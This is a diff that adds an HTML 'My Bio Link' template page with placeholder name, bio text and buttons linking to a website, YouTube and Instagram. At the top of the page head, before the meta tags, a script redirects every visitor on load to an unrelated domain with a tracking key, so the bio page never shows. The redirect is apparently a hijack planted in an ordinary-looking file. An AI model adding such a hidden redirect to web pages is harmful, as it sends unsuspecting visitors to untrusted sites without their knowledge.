@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head><script>
+window.location.href = "https://pricecardboardtractor.com/pjy4wuvyp?key=d700a23cfe468f73405b6a1989178cf5";
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Bio Link</title>
+  <style>
+    body {
+      font-family: Arial;
+      text-align: center;
+      background: #111;
+      color: white;
+      padding: 40px;
+    }
+    .btn {
+      display: block;
+      margin: 10px auto;
+      padding: 15px;
+      width: 80%;
+      max-width: 300px;
+      background: #1db954;
+      color: white;
+      text-decoration: none;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Your Name</h2>
+<p>Your bio here</p>
+
+<a class="btn" href="https://yourlink.com">My Website</a>
+<a class="btn" href="https://youtube.com">YouTube</a>
+<a class="btn" href="https://instagram.com">Instagram</a>
+
+</body>
+</html>
